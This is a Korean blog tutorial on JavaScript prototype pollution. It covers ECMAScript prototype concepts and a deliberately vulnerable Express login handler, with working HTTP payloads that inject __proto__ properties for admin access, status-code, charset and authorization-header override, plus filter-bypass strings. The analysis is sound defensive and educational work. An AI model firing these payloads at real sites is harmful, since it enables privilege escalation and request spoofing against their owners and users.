---
title: "Prototype Pollution 취약점 분석"
date: 2025-05-20
categories: [Vuln Analysis]
tags: [javascript, prototype pollution]
---

---

## 1. 기초 개념정리

- **ECMA Script 명세서**에서 사용하는 주요 개념들에 대한 정리입니다. 괜찮으신 분들은 곧바로 "2. Prototype Pollution 이란?" 항목으로 이동하시면 되겠습니다만 처음 이신분들은 확인하시는걸 추천드립니다.

### 01. javascript 에서 내부 메서드(Internal Method) 와 내부 슬롯(Internal Slot)이란?

- 내부 메서드와 내부 슬롯은 javascript 코드 안에서는 등장하지 않고 javascript 엔진의 구현과 동작을 설명하기 위해 **ECMA Script 명세서에서 사용하는 개념**입니다.

- 내부 메서드(Internal Method)란?

  - 객체의 동작을 정의하는 알고리즘입니다.
  - `[[GET]]`, `[[CALL]]` 등 이름은 다형적이고 호출 시 동작은 객체에 따라 다릅니다.

- 내부 슬롯(Internal Slot)이란?
  - 객체의 내부 상태 저장소입니다.
  - 상속되지 않으며 JS코드로 직접 접근은 불가합니다.
  - `[[Prototype]]` 과 같은 형식으로 표기합니다.

### 02. `[[Prototype]]` 과 Object.prototype 이란?

#### `[[Prototype]]`

- JavaScript에서 `[[Prototype]]`은 **모든 일반 객체가 가지는 내부 슬롯**으로, null 또는 다른 객체를 참조합니다. 이 슬롯은 **객체 간 상속을 구현**하기 위해 사용되며, 객체가 속성을 직접 갖고 있지 않을 경우 해당 프로토타입 체인을 따라 상위 객체에서 속성을 탐색하는 방식으로 동작합니다.

#### Object.prototype

- Object.prototype 은 **모든 표준 객체들이 상속받는 프로토타입의 최상단 객체** 입니다.
- Object.prototype의 `[[Prototype]]`은 null입니다. 즉 더 이상 상속할 프로토타입이 없다는 뜻입니다.
- Object.prototype은 `%Object.prototype%` 입니다.
  - `%name%`은 ECMA Script명세서에서 내재객체를 뜻하며 **realm마다 하나씩** 존재합니다.
- 따라서 하나의 realm 환경당 Object.prototype은 하나입니다.

#### Realm

- ECMAScript 명세에서는 Realm을 다음과 같이 정의합니다:
  - 개념적으로, Realm은 내재 객체의 집합, ECMAScript 전역 환경, 해당 전역 환경의 범위 내에서 로드된 모든 ECMAScript 코드, 그리고 기타 관련 상태 및 자원으로 구성된다.

## 2. Prototype Pollution 이란 ?

- 공격자가 **전역 객체의 프로토타입(Object.prototype)** 에 의도적으로 속성을 주입(변조)함으로써, 해당 프로토타입을 상속받는 **모든 객체에 악성 속성이 전파되는** 보안 취약점입니다.
- javascript에서는 객체가 속성을 갖고 있지 않으면 Prototype 체인을 따라 상위 객체에서 속성을탐색하는 방식으로 동작하므로, 최상위 객체인 Object.prototype의 속성에 악의적인 값을 삽입하게되면 모든 객체가 악의적인 값에 접근 할 수 있게됩니다.

## 3. Prototype Pollution 취약점 코드

### 클라이언트 측 취약 코드

- 브라우저 콘솔에서 테스트 가능합니다.

```javascript
Object.prototype.isAdmin = true;

// isAdmin 권한 획득
const User = {};
if (User.isAdmin) {
  console.log("is Admin");
} else {
  console.log("is User");
}
```

### 서버 측 취약 코드

- 코드입니다.

```js
// server.js
const express = require("express");
const bodyParser = require("body-parser");
const app = express();

app.use(bodyParser.json());

app.post("/login", (req, res) => {
  // 취약한 병합 로직
  const user = {};
  Object.assign(user, req.body); // ← 여기서 Prototype Pollution 발생 가능

  // 권한 검사
  if (user.isAdmin) {
    res.send("✅ 관리자 접근 허용됨");
  } else {
    res.send("❌ 일반 사용자 접근 거부");
  }
});

app.listen(3000, () => console.log("Server running on port 3000"));
```

- 전송 post입니다.

```http
POST /login HTTP/1.1
Host: vulnerable.site
Content-Type: application/json

{
  "__proto__": {
    "isAdmin": true
  }
}
```

## 4. Prototype Pollution 취약 여부 분석 방법

### 클라이언트 측 분석 방법

- 아래 코드의 `yourTestKey` 에 의심이 가는 속성 값을 설정 후 브라우저 콘솔창에 코드를 입력합니다.
- 이후 사이트에서 버튼 클릭 등 동작을 수행하며 콘솔에 trace 로그가 남는 여부를 확인합니다. 로그가 남는다면 해당 속성이 Prototype Pollution에 취약할 것으로 추측할 수 있습니다.

```js
Object.defineProperty(Object.prototype, "yourTestKey", {
  get() {
    console.trace("💥 yourTestKey accessed");
    return "polluted";
  },
});
```

### 서버 측 분석 방법

#### 01. JSON 무작위 삽입

- **객체형 입력(JSON)** 이 전달되는 API를 찾습니다.
- 오염 페이로드 전송 (Prototype Pollution Payload)을 시도합니다.

```http
POST /api/profile/update HTTP/1.1
Content-Type: application/json

{
  "__proto__": {
    "isAdmin": true
  }
}
```

```json
{
  "settings": {
    "__proto__": {
      "debug": true
    }
  }
}
```

- 이후 admin 권한 만 접근 가능한 페이지등에 접근을 시도해봅니다.

```http
GET /dashboard HTTP/1.1
→ 응답: "Welcome, Admin"  ← 오염 성공!
```

#### 02. for .. in 루프 악용

- JavaScript `for...in`루프는 프로토타입 체인을 통해 상속받은 속성을 포함하여 객체의 모든 열거 가능한 속성을 반복합니다.
- 예시 1) 객체

```js
const myObject = { a: 1, b: 2 };

// pollute the prototype with an arbitrary property
Object.prototype.foo = "bar";

// confirm myObject doesn't have its own foo property
myObject.hasOwnProperty("foo"); // false

// list names of properties of myObject
for (const propertyKey in myObject) {
  console.log(propertyKey);
}

// Output: a, b, foo
```

- 예시 2) 배열

```js
const myArray = ["a", "b"];
Object.prototype.foo = "bar";

for (const arrayKey in myArray) {
  console.log(arrayKey);
}

// Output: 0, 1, foo
```

- 위와 같은 취약 코드가 서버에 존재 시 아래와 같이 요청을 시도하게되면

```http
POST /user/update HTTP/1.1
Host: vulnerable-website.com
...
{
    "user":"wiener",
    "firstName":"Peter",
    "lastName":"Wiener",
    "__proto__":{
        "foo":"bar"
    }
}
```

- 응답의 업데이트된 객체에 표시될 수 있습니다.

```http
HTTP/1.1 200 OK
...
{
    "username":"wiener",
    "firstName":"Peter",
    "lastName":"Wiener",
    "foo":"bar"
}
```

#### 03. 상태코드 재정의

- 200 OK 지만 응답 본문에 다른 상태의 오류개체가 포함되는 경우가 흔합니다.

```http
HTTP/1.1 200 OK
...
{
    "error": {
        "success": false,
        "status": 401,
        "message": "You do not have permission to access this resource."
    }
}
```

- Node `http-errors`모듈에는 이러한 종류의 오류 응답을 생성하기 위한 다음 함수가 포함되어 있습니다.
  - 400에서 599 사이의 코드를 입력해야 합니다.

```js
function createError () {
    //...
    if (type === 'object' && arg instanceof Error) {
        err = arg
        status = err.status || err.statusCode || status
    } else if (type === 'number' && i === 0) {
    //...
    if (typeof status !== 'number' ||
    (!statuses.message[status] && (status < 400 || status >= 600))) {
        status = 500
    }
    //...
```

- 따라서 응답 값에 내가 원하는 상태코드가 삽입되는 여부를 통해 prototype pollution 취약점이 가능한지 알 수 있습니다.

#### 04. JSON 공백 재정의

- Express 프레임워크는 `json spaces`응답에서 JSON 데이터를 들여쓰기하는 데 사용되는 공백 수를 설정할 수 있는 옵션을 제공합니다.
- Express 4.17.4에서 프로토타입 오염 문제가 해결되었지만, 업그레이드하지 않은 웹사이트는 여전히 취약할 수 있습니다
- 단순히 prototype pollution 취약점이 동작하는지 파악 하기위해 사용해보면 좋을 듯합니다.

```js
{
  "__proto__": {
    "json spaces": 10000
  }
}
```

#### 05. charset 재정의

##### Expressjs

- Express에서 body-parser 모듈의 lib/types/json.js 소스코드와 /lib/utils.js 를 보면 아래와같이 되어있습니다.
  - 'charset' 속성에 Prototype pollution 악용을 시도해볼 수 있습니다.

```js
var charset = getCharset(req) || "utf-8";

// lib/utils.js 코드
function getCharset(req) {
  try {
    return (contentType.parse(req).parameters.charset || "").toLowerCase();
  } catch (e) {
    return undefined;
  }
}

read(req, res, next, parse, debug, {
  encoding: charset,
  inflate: inflate,
  limit: limit,
  verify: verify,
});
```

- Prototype pollution 악용 시도

1. 응답에 반영되는 속성에 임의의 UTF-7 인코딩 문자열을 추가합니다. 예를 들어, `foo`UTF-7에서는 `+AGYAbwBv-`.

```js
{ "sessionId":"0123456789", "username":"wiener", "role":"+AGYAbwBv-" }
```

2. 요청을 보냅니다. 서버는 기본적으로 UTF-7 인코딩을 사용하지 않으므로, 이 문자열은 인코딩된 형태로 응답에 나타나야 합니다.

3. `content-type`UTF-7 문자 집합을 명시적으로 지정하는 속성으로 프로토타입을 오염시켜봅니다.

```js
{
    "sessionId":"0123456789",
    "username":"wiener",
    "role":"default",
    "__proto__":{
        "content-type": "application/json; charset=utf-7"
    }
}
```

4. 첫 번째 요청을 반복합니다. 프로토타입을 성공적으로 오염시켰다면 이제 응답에서 UTF-7 문자열이 디코딩되었을 것입니다.

```js
{
    "sessionId":"0123456789",
    "username":"wiener",
    "role":"foo"
}
```

##### Node

- Object.prototype에 헤더 속성이 오염되어 있으면, `dest[field] === undefined` 조건은 false가 되어 실제 요청 헤더가 무시되고, **공격자가 삽입한 오염된 속성값이 우선 적용되는 결과**가 발생합니다.

```js
IncomingMessage.prototype._addHeaderLine = _addHeaderLine;
function _addHeaderLine(field, value, dest) {
    // ...
    } else if (dest[field] === undefined) {
        // Drop duplicates
        dest[field] = value;
    }
}
```

- 서버가 `req.headers['authorization']`을 읽으려 할 때, 실제 헤더가 무시되고 오염된 Bearer attacker_token이 적용되게됩니다.

```http
POST /api/some-endpoint HTTP/1.1
Host: logiciris.com
Content-Type: application/json
Authorization: Bearer legit-user-token

{
  "__proto__": {
    "authorization": "Bearer attacker-token"
  }
}
```

- 위와같은 방식으로 다른 모든 헤더에도 적용이 가능합니다.

## 5. 우회방안

### `__proto__` 필터링 되어있을 경우

1. `constructor` 사용하여 우회
   - `myObject.constructor.prototype` 이것은 `myObject.__proto__` 이것과 동일합니다.

```js
myObject.constructor.prototype;
```

2. 단순 문자열 제거 시 우회

```text

// 기존
vulnerable-website.com/?__proto__.gadget=payload

// 우회
vulnerable-website.com/?__pro__proto__to__.gadget=payload

```

## 참고

- https://tc39.es/ecma262/#sec-object-internal-methods-and-internal-slots
- https://portswigger.net/web-security/prototype-pollution
- https://developer.mozilla.org/en-US/docs/Learn_web_development/Extensions/Advanced_JavaScript_objects/Object_prototypes
- https://tc39.es/ecma262/#sec-ordinary-and-exotic-objects-behaviours
- https://github.com/expressjs/body-parser
- https://github.com/nodejs/node/blob/main/lib/_http_incoming.js
- https://nodejs.org/api/http.html?utm_source=chatgpt.com
